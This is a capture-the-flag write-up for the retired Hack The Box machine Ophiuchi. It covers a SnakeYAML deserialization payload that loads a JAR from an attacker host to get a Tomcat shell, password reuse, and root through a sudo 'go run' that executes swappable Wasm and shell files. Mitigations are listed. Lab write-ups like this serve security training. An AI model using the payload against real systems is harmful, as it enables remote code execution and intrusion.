---
machine: Ophiuchi
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, tomcat, yaml, deserialization, wasm, go, privesc]
---

# Ophiuchi — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Tomcat 9.0.38 runs an app that parses YAML with SnakeYAML. A deserialization payload loads a remote JAR and gives a `tomcat` shell; the `tomcat-users.xml` password is reused for `admin`. `admin` can run `go run /opt/wasm-functions/index.go` as root; the program reads `main.wasm` and runs `deploy.sh`, and both can be replaced for root.

## Recon

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` SSH and `8080` Tomcat 9.0.38.
- The page says the service is down, but it processes submitted YAML.
- `/manager` exists and requires credentials.

## Enumeration

The form passes input to a Java YAML parser. SnakeYAML allows class instantiation and remote JAR loading through `!!java.net.URL`.

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/yaml-payload.jar"]]]]
```

## Foothold

Compile `yaml-payload` with a class that runs a reverse shell, serve the JAR and send the YAML. The shell runs as `tomcat`.

## Lateral movement

`/opt/tomcat/conf/tomcat-users.xml` holds the `admin` password. The same password works for the system `admin` account.

```bash
su admin
ssh admin@ophiuchi.htb
```

## Privilege escalation

`admin` can run `go run /opt/wasm-functions/index.go` as root. The program reads `main.wasm`, runs it and, if it returns 1, calls `deploy.sh`. Replace both files in the working directory: a Wasm returning 1 and a `deploy.sh` with a reverse shell.

```bash
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

## Evidence

- Tomcat and SnakeYAML.
- Remote JAR and `tomcat` shell.
- `tomcat-users.xml` password and `admin`.
- `go run` as root.
- `main.wasm`/`deploy.sh` and root.

## Lessons learned

- SnakeYAML without safe types is exploitable deserialization.
- Tomcat credentials are reused on the system.
- `go run` as root executes files from the current directory.
- A binary trusting a local Wasm and script is arbitrary write.

## Mitigation and detection

- Use `SafeConstructor` and reject arbitrary types.
- Separate Tomcat and system credentials.
- Do not run `go run` as root; use compiled binaries and absolute paths.
- Validate the Wasm and script before execution.

## References

- [0xdf — Ophiuchi](https://0xdf.gitlab.io/2021/07/03/htb-ophiuchi.html)
- [IppSec — Ophiuchi](https://www.youtube.com/watch?v=9-AQQkJA1X4)
- [Hack The Box — Ophiuchi](https://app.hackthebox.com/machines/ophiuchi)
